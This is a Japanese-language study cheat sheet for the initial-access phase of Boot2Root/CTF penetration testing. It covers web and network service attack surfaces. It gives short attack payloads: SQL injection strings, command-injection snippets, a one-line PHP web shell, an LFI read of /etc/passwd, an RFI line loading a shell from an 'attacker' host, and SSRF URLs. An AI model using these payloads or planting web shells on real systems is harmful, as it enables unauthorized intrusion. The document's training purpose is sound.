# Initial Access（初期侵入）

Initial Access は、Recon / Enumeration で得た情報をもとに  
**ターゲットへ最初の侵入を成功させるフェーズ**です。

---

# 🎯 目的

- 外部サービスの脆弱性を利用して侵入する  
- 認証情報を使ってログインする  
- WebShell / RCE / LFI / SQLi などを利用する  
- SMB / FTP / DB / Redis などから侵入する  

---

## 🔍 攻撃フロー
1. 攻撃可能なサービスの特定（Enumeration の結果）
2. 認証情報の試行（弱パスワード・デフォルト）
3. Web 脆弱性の利用（SQLi / RCE / File Upload / LFI / SSRF）
4. SMB / FTP / DB などのサービス侵入
5. WebShell / Reverse Shell の取得
6. ローカル環境の確認（whoami / id / hostname）
7. 次の Local Enumeration へ進む

---

## 🧭 Attack Surface Deep Dive（攻撃面の深掘り）
Enumeration で特定した Attack Surface を、  
「侵入可能かどうか」の観点で深掘りする。

### [Web](#web)
- [SQL Injection](#sql-injectionsqli)
- [Command Injection](#command-injectionrce)  
- [File Upload（WebShell）](#fileuploadwebshell) 
- [LFI / RFI](#lfi--rfi)  
- [SSRF](#ssrf)  
- [認証バイパス](#認証バイパス)  

### SMB
- 認証情報の利用  
- 共有フォルダから WebShell 配置  
- バックアップファイルの取得  

### FTP
- anonymous  
- 書き込み可能か  
- WebShell アップロード  

### SSH
- 弱パスワード  
- 公開鍵  
- パスワードスプレー  

### Database（MySQL / PostgreSQL）
- 弱パスワード  
- Web アプリの認証情報  
- 任意クエリ実行  

### Redis
- 未認証アクセス  
- SSH authorized_keys 書き込み

### その他の初期侵入
- ○○
- 
---

## Web

Web は最も突破口が多い。

### SQL Injection（SQLi）
```
' OR 1=1 --
' UNION SELECT ...
```

#### 確認ポイント
- ログインバイパス  
- DB ダンプ  
- 認証情報の取得  

---

### Command Injection（RCE）
```
; id
&& whoami
```

#### 確認ポイント
- OS コマンド実行  
- WebShell の設置  

---

### File Upload（WebShell）
```
<?php system($_GET['cmd']); ?>
```

#### 確認ポイント
- 拡張子制限  
- MIME チェック  
- バイパス（.php.jpg など）  

---

### LFI / RFI
```
?page=../../../../etc/passwd
?page=http://attacker/shell.txt
```

#### 確認ポイント
- ローカルファイル読み取り  
- RCE への発展  

---

### SSRF
```
http://127.0.0.1:3306
http://localhost/admin
```

#### 確認ポイント
- 内部サービスの探索  
- 認証バイパス  


### 認証バイパス

---

## SMB

```
smbclient //<TARGET>/<SHARE>
```

#### 確認ポイント
- 認証情報  
- Web ソースコード  
- バックアップファイル  
- SSH鍵  

---

## FTP

```
ftp <TARGET>
```

#### 確認ポイント
- anonymous  
- 書き込み可能か  
- WebShell アップロード  

---

## SSH

```
ssh user@<TARGET>
```

#### 確認ポイント
- 弱パスワード  
- 公開鍵  
- パスワードスプレー  

---

## Database

### MySQL
```
mysql -h <TARGET> -u root -p
```

#### 確認ポイント
- 弱パスワード  
- DB 内のユーザー情報  
- Web アプリの認証情報  

---

### PostgreSQL
```
psql -h <TARGET> -U postgres
```

---

## Redis

```
redis-cli -h <TARGET>
```

#### 確認ポイント
- 未認証アクセス  
- SSH authorized_keys 書き込み  
- 内部サービスの情報  

---

## その他の初期侵入

### RDP
```
xfreerdp /u:user /p:pass /v:<TARGET>
```

### VNC
```
vncviewer <TARGET>
```

### SNMP
```
snmpwalk -v2c -c public <TARGET>
```

---

## 初期侵入後の確認

初期侵入が成功したら、以下を確認する：

### ✔ whoami  
### ✔ id  
### ✔ hostname  
### ✔ pwd  
### ✔ ls -la  
### ✔ netstat / ss  
### ✔ sudo -l  

これらは Boot2Root の **Local Enumeration** に続く。

---

## Boot2Root との連携

Boot2Root の Initial Access 章は軽量化されており、  
詳細はこのページにリンクされます。

Boot2Root の流れ：

```
Enumeration
↓
Initial Access
↓
Local Enumeration
```
